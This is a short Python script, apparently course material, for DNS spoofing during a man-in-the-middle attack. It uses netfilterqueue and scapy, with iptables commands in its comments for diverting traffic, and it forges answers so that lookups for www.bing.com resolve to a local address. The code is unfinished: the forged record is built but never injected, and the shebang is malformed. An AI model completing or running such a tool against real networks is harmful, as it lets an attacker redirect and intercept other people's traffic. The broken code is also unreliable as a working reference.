#!usr/bin/env python

import netfilterqueue as nfq
import scapy.all as scapy

# creating a queue: iptables -I FORWARD -j NFQUEUE --queue-num 0 (only for MITM)
# creating queue locally: iptables -I INPUT/OUTPUT -j NFQUEUE --queue-num 0
# removing queues: iptables --flush

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
    packet.accept()

queue = nfq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()




